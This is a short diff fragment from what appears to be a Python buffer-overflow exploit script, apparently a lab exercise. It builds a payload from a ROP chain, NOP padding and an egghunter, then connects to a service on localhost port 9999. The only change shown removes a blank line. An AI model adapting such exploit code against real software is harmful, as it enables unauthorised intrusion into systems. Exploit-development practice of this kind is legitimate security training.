@@ -54,7 +54,6 @@ payload += rop_chain
 payload += "\x90" * 20 # padding
 payload += egghunter
 
-
 try:
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(("127.0.0.1", 9999))
